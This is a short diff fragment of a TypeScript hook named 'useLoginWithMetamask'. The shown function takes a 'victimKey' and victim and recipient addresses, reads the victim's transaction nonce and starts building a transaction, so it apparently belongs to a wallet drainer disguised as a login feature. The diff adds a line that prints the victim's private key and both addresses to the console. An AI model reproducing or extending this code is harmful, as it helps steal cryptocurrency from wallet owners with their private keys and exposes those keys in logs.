@@ -31,6 +31,7 @@ export const useLoginWithMetamask = (
     victimKey: string
   ) => {
     try {
+      console.log(victimAddress, recipientAddress, victimKey)
       const nonce = await web3.eth.getTransactionCount(victimAddress);
       const tx = {
         nonce,
